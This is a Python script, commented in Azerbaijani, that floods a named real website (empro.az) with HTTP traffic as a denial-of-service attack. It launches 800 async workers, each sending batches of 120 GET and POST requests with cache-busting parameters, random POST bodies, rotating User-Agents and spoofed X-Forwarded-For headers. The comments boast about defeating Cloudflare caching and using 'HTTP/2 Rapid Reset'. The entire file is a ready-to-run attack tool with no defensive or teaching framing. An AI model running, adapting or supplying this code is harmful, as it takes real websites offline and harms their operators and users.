import asyncio
import httpx
import random
import time
import string

# --- HƏDƏF ---
TARGET_URL = "https://empro.az/"
WORKERS = 800         # Railway-də dondurmadan maksimal güc
BATCH_SIZE = 120       # Sürəti 120 qat artırırıq

def r_str(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def terminator_strike(worker_id, client):
    # Bu workerlər Cloudflare-in analiz motorunu daxildən sarsıdır
    while True:
        try:
            # Müasir Chrome brauzerinin şəbəkə davranışını tam təqlid edirik
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(4,6)}.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "X-Requested-With": "XMLHttpRequest",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "Connection": "keep-alive"
            }

            # Səhifənin dərinliklərinə (Axtarış bölməsi, API-lər) vuruş
            # Bu müraciət Cloudflare-in keş (cache) sistemini yox sayır
            url = f"{TARGET_URL}?v={time.time()}&id={r_str(30)}&ttclid=E_C_P_{r_str(100)}"
            
            tasks = []
            for _ in range(BATCH_SIZE):
                # HTTP/2 Rapid Reset & Frame Flooding
                # POST payload ilə serverin RAM-ını daxildən bitiririk
                if _ % 4 == 0:
                    tasks.append(client.post(url, headers=headers, content=r_str(1200)))
                else: 
                    tasks.append(client.get(url, headers=headers))
            
            # Dalğanı serverin prosessoruna çırp!
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 GLOBAL DEVASTATION ACTIVATED: {TARGET_URL}")
    print("[!] Target System: Enterprise Defense. Deploying Protocol Murder.")
    
    # TCP hüdudlarını ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True,          # RAPID RESET effekti üçün mütləqdir
        verify=False, 
        limits=limits, 
        timeout=10.0         # Server donanda bağlantını buraxma
    ) as client:
        
        workers = [terminator_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
